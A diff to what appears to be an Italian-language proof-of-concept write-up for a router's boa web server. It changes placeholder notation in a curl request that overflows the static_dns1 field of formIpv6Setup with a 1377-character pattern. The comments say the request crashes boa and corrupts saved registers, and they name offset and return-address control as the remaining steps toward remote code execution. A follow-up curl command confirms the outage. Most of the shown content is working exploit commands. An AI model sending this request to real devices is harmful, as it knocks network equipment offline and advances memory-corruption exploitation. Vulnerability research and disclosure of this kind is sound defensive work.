@@ -272,16 +272,16 @@ section .PROOF_OF_CONCEPT
 curl -X POST 'http://<TARGET>/boafrm/formIpv6Setup' \
   -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
   -H 'X-Requested-With: XMLHttpRequest' \
-  -H 'Referer: http://<TARGET>/IPv6_Setup.htm' \
-  --data 'sessionCheck=<TOKEN>&submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=1&pppUserName=&pppPassword=admin&dnsMode_P=0&pppoe_dns1=&pppoe_dns2=&pppoeMtu=1492&static_ipv6=&static_gw=&static_dns1=<PATTERN_A_x1377>&static_dns2=&static_mtu=1500&dhcp_ip=%3A%3A&pri_dns=%3A%3A&sec_dns=%3A%3A&dnsMode_D=1&dhcp_dns1=1&DhcpMtu=1500&PreType=0'
+  -H 'Referer: http://(TARGET)/IPv6_Setup.htm' \
+  --data 'sessionCheck=(TOKEN)&submit-url=%2FIPv6_Setup.htm&update=&wan_enable=1&OriginType=1&pppUserName=&pppPassword=admin&dnsMode_P=0&pppoe_dns1=&pppoe_dns2=&pppoeMtu=1492&static_ipv6=&static_gw=&static_dns1=(PATTERN_A_x1377)&static_dns2=&static_mtu=1500&dhcp_ip=%3A%3A&pri_dns=%3A%3A&sec_dns=%3A%3A&dnsMode_D=1&dhcp_dns1=1&DhcpMtu=1500&PreType=0'
 
-;<TOKEN> va sostituito con il sessionCheck catturato da Burp durante una sessione autenticata attiva; <PATTERN_A_x1377> e' la stringa di 1377 caratteri 'A' che ha prodotto il crash osservato nella sezione precedente.
+;(TOKEN) va sostituito con il sessionCheck catturato da Burp durante una sessione autenticata attiva; <PATTERN_A_x1377> e' la stringa di 1377 caratteri 'A' che ha prodotto il crash osservato nella sezione precedente.
 
 ;questo PoC dimostra il denial of service (crash del processo boa) e corruzione confermata di registri salvati; non include ancora un  pattern per il calcolo dell'offset esatto ne' un controllo verificato del return address, passi necessari per trasformare il DoS in RCE.
 
 ;verifica dello stato del servizio dopo l'invio:
 
-curl -s -o /dev/null -w '%{http_code}\n' http://<TARGET>/login.htm
+curl -s -o /dev/null -w '%{http_code}\n' http://(TARGET)/login.htm
 
 ;un codice HTTP diverso da 200, o l'assenza di risposta entro timeout, conferma che boa non sta piu' rispondendo sulla porta 80 dopo il payload.
 
